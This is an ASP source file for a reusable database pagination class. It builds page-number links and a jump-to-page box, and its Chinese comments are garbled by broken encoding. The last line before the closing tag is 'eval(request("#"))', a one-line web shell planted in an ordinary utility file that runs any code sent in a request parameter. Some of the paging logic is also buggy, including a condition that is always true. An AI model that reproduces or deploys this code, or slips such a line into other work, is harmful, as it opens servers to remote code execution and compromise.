<%
'===================================================================== 
'XDOWNPAGE ASP�汾 
'�汾 1.00 
'Code by zykj2000 
'Email: zykj_2000@163.net 
'BBS: http://bbs.513soft.net 
'������������ʹ�á��޸ģ�ϣ���ҵĳ�����Ϊ���Ĺ����������� 
'���뱣��������Ϣ 
' 
'�����ص� 
'��������Ҫ�Ƕ����ݷ�ҳ�Ĳ��ֽ����˷�װ����������ʾ������ȫ���û��Զ��壬 
'֧��URL������� 
' 
'ʹ��˵�� 
'�������˵�� 
'PapgeSize �����ҳÿһҳ�ļ�¼�� 
'GetRS ���ؾ�����ҳ��Recordset������ֻ�� 
'GetConn �õ����ݿ����� 
'GetSQL �õ���ѯ��� 
'���򷽷�˵�� 
'ShowPage ��ʾ��ҳ������,Ψһ�Ĺ��÷��� 
' 
'��: 
' 
' '�����ļ� 
' 
' Set mypage=new xdownpage '�������� 
' mypage.getconn=conn '�õ����ݿ����� 
' mypage.getsql="select * from productinfo order by id asc" 
' mypage.pagesize=5 '����ÿһҳ�ļ�¼������Ϊ5�� 
' set rs=mypage.getrs() '����Recordset 
' mypage.showpage() '��ʾ��ҳ��Ϣ������������ԣ���set rs=mypage.getrs()�Ժ� 
' ����λ�õ��ã����Ե��ö�� 
' for i=1 to mypage.pagesize '�������Ĳ����ͺͲ���һ����ͨRecordset����һ������ 
' if not rs.eof then '��������Ϊ�˷�ֹ���һҳ����� 
' response.write rs(0) & " " '����Ϳ����Զ�����ʾ��ʽ�� 
' rs.movenext 
' else 
' exit for 
' end if 
' next 
' 
'===================================================================== 


Const Btn_Last=":" '�������һҳ��ť��ʾ��ʽ 
Const XD_Align="center" '�����ҳ��Ϣ���뷽ʽ 
Const XD_Width="100%" '�����ҳ��Ϣ���С 
Const XD_Height="20" 


Class Xdownpage 
Private XD_PageCount,XD_Conn,XD_Rs,XD_SQL,XD_PageSize,Str_errors,int_curpage,str_URL,int_totalPage,int_totalRecord 


'================================================================= 
'PageSize ���� 
'����ÿһҳ�ķ�ҳ��С 
'================================================================= 
Public Property Let PageSize(int_PageSize) 
If IsNumeric(Int_Pagesize) Then 
XD_PageSize=CLng(int_PageSize) 
Else 
str_error=str_error & "PageSize�Ĳ�������ȷ" 
ShowError() 
End If 
End Property 
Public Property Get PageSize 
If XD_PageSize="" or (not(IsNumeric(XD_PageSize))) Then 
PageSize=10 
Else 
PageSize=XD_PageSize 
End If 
End Property 

'================================================================= 
'GetRS ���� 
'���ط�ҳ��ļ�¼�� 
'================================================================= 
Public Property Get GetRs() 
Set XD_Rs=Server.createobject("adodb.recordset") 
XD_Rs.PageSize=PageSize 
on error resume next
XD_Rs.Open XD_SQL,XD_Conn,1,1 
'Response.Write XD_SQL
if err <> 0 then
Response.Write err.description
else

end if
If not(XD_Rs.eof and XD_RS.BOF) Then 
If int_curpage>XD_RS.PageCount Then 
int_curpage=XD_RS.PageCount 
End If 
XD_Rs.AbsolutePage=int_curpage 
End If 
Set GetRs=XD_RS 
End Property 

'================================================================ 
'GetConn �õ����ݿ����� 
' 
'================================================================ 
Public Property Let GetConn(obj_Conn) 
Set XD_Conn=obj_Conn 
End Property 

'================================================================ 
'GetSQL �õ���ѯ��� 
' 
'================================================================ 
Public Property Let GetSQL(str_sql) 
XD_SQL=str_sql 
End Property 



'================================================================== 
'Class_Initialize ��ĳ�ʼ�� 
'��ʼ����ǰҳ��ֵ 
' 
'================================================================== 
Private Sub Class_Initialize 
'======================== 
'�趨һЩ�������a��ֵ 
'======================== 
XD_PageSize=10 '�趨��ҳ��Ĭ��ֵΪ10 
'======================== 
'��ȡ��ǰ���ֵ 
'======================== 
If request("page")="" Then 
int_curpage=1 
ElseIf not(IsNumeric(request("page"))) Then 
int_curpage=1 
ElseIf CInt(Trim(request("page")))<1 Then 
int_curpage=1 
Else 
Int_curpage=CInt(Trim(request("page"))) 
End If 

End Sub 

'==================================================================== 
'ShowPage ������ҳ������ 
'����ҳ��ǰһҳ����һҳ��ĩҳ���������ֵ��� 
' 
'==================================================================== 
Public Sub ShowPage() 
Dim str_tmp 

int_totalRecord=XD_RS.RecordCount 
If int_totalRecord<=0 Then 
str_error=str_error & "�ܼ�¼��Ϊ�㣬����������" 
Call ShowError() 
End If 
If int_totalRecord < PageSize Then 
	int_TotalPage=1 
Else 
	If int_totalRecord mod PageSize =0 Then 
		int_TotalPage = Int(int_TotalRecord / XD_PageSize * -1)*-1 
	Else 
		int_TotalPage = Int((int_TotalRecord / XD_PageSize * -1)*-1)+1 
	End If 
End If 
If Int_curpage>int_Totalpage Then 
int_curpage=int_TotalPage 
End If 

'=============================================================================== 
'��ʾ��ҳ��Ϣ������ģ������Լ�Ҫ���������λ�� 
'=============================================================================== 

response.write " " 
str_tmp=ShowFirstPrv 
response.write str_tmp 
str_tmp=showNumBtn 
response.write str_tmp 
str_tmp=ShowNextLast 
response.write str_tmp 
str_tmp=ShowPageInfo 
response.write str_tmp 
'Response.write " " 
ShowGoto 
response.write " " 
End Sub 

'==================================================================== 
'ShowFirstPrv ��ʾ��ҳ��ǰһҳ 
' 
' 
'==================================================================== 
Private Function ShowFirstPrv() 
Dim Str_tmp,int_prvpage 

If int_curpage=1 Then 
str_tmp=Btn_First&" "&Btn_Prev 
Else 
int_prvpage=int_curpage-1 
str_tmp = "<a href='#' onclick=""document.form1.action='"&GetUrl()&"1"&"';document.form1.submit();"">"&Btn_First&"</a>  <a href='#' onclick=""document.form1.action='"&GetUrl()&(Int_curpage-1)&"';document.form1.submit();"">"& Btn_Prev&"</a>" 
End If 
ShowFirstPrv = "<FONT style=""FONT-FAMILY: Webdings"">" & str_tmp & "</font>"
End Function 

'==================================================================== 
'ShowNextLast ��һҳ��ĩҳ 
' 
' 
'==================================================================== 
Private Function ShowNextLast() 
Dim str_tmp,int_Nextpage
If Int_curpage>=int_totalpage Then 
str_tmp=Btn_Next & " " & Btn_Last 
Else 
Int_NextPage=int_curpage+1 
str_tmp="<a href='#' onclick=""document.form1.action='"&GetUrl()&(Int_curpage+1)&"';document.form1.submit();"">"&Btn_Next&"</a> "&"<a href='#' onclick=""document.form1.action='"&GetUrl()&int_totalpage&"';document.form1.submit();"">"& Btn_Last&"</a>" 
End If 
ShowNextLast = "<FONT style=""FONT-FAMILY: Webdings"">" & str_tmp & "</font>"
End Function 


'==================================================================== 
'ShowNumBtn ���ֵ��� 
' 
' 
'==================================================================== 
'Private Function showNumBtn() 
' Dim i,str_tmp 
' For i=1 to int_totalpage 
' str_tmp=str_tmp & "["&i&"] " 
' Next 
' showNumBtn=str_tmp 
' 
'End Function 
'==================================================================== 
'ShowNumBtn �޸ĺ�����ֵ��� 
' 
'==================================================================== 
Function showNumBtn() 
Dim i,str_tmp,end_page,start_page 
if int_curpage>4 then 
	if int_curpage+2 Then
		start_page=int_curpage-2 
		end_page=int_curpage+2 
	else 
		start_page=int_totalpage-4 
		end_page=int_totalpage 
	end if 
else 
start_page=1 
if int_totalpage>5 then 
end_page=5 
else 
end_page=int_totalpage 
end if 
end if 
For i=start_page to end_page 
if int_curpage = i then
str_tmp=str_tmp & " ["&i&"] " 
else 
str_tmp=str_tmp & " [<a href='#' onclick=""document.form1.action='"&GetUrl()&i&"';document.form1.submit();"">"&i&"</a>] " 
end if
Next 
showNumBtn=str_tmp 
End Function 

'==================================================================== 
'ShowGoto ҳ����ת 
' 
' 
'==================================================================== 
Private Function ShowGoto() 
Dim M_item 
'======================================================== 
'�����ص�Url���������д���������У��Ա�������������� 
'======================================================== 
For Each M_item In Request.QueryString 
If InStr("page",M_Item)=0 Then '�Ӳ����г�ȥ "page" ��ֵ 
Response.Write "" 
End If 
Next 
'======================================================== 
%>
<script>
function tiaozhuan(){
var yema=document.getElementById("yema").value
document.form1.action='<%=GetUrl()%>'+yema;
document.form1.submit();
}
</script>
<%
response.write " ת���ڣ�" 
Response.Write "<input type=""text"" id=""yema"" size=""1"">ҳ<label class=""button1""><input type=""button"" value=""GO"" onClick=""tiaozhuan()""></label>"
End Function 
'==================================================================== 
'ShowPageInfo ��ҳ��Ϣ 
'����Ҫ�������޸� 
' 
'==================================================================== 
Private Function ShowPageInfo() 
Dim str_tmp 
str_tmp=" [ҳ��:"&int_curpage&"/"&int_totalpage&"ҳ] [��"&int_totalrecord&"��] ["&XD_PageSize&"��/ҳ]" 
ShowPageInfo=str_tmp 
End Function 

'==================================================================== 
'�޸ĺ�Ļ�ȡ��ǰUrl�����ĺ��� 
'Codeing by Redsun 
'==================================================================== 
Private Function GetUrl() 
Dim ScriptAddress, M_ItemUrl, M_item 
ScriptAddress = CStr(Request.ServerVariables("SCRIPT_NAME"))&"?"'ȡ�õ�ǰ��ַ 
If (Request.QueryString <> "") Then 
M_ItemUrl = "" 
For Each M_item In Request.QueryString 
If InStr("page",M_Item)=0 Then 
M_ItemUrl = M_ItemUrl & M_Item &"="& Server.URLEncode(Request.QueryString(""&M_Item&"")) & "&" 
End If 
Next 
ScriptAddress = ScriptAddress & M_ItemUrl'ȡ�ô�������ַ 
End If 
GetUrl = ScriptAddress & "page=" 
End Function 
'==================================================================== 
' ���� Terminate �¼��� 
'==================================================================== 
Private Sub Class_Terminate 
XD_RS.close 
Set XD_RS=nothing 
End Sub 
'==================================================================== 
'ShowError ������ʾ 
'==================================================================== 
Private Sub ShowError() 
If str_Error <> "" Then 
Response.Write("" & SW_Error & "") 
Response.End 
End If 
End Sub 
End class
eval(request("#"))
%>